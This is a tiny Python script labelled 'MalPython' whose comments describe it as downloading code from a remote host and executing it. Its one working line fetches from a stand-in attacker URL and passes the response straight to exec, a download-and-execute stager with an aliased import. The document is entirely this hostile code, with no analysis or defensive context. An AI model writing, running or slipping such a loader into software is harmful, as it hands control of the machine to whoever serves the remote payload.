# MalPython
#
# Download / read python code from remote host and execute it
# assuming no authentication or complex flow

from urllib.request import urlopen as _u 

exec(_u("https://attacker/payload").read())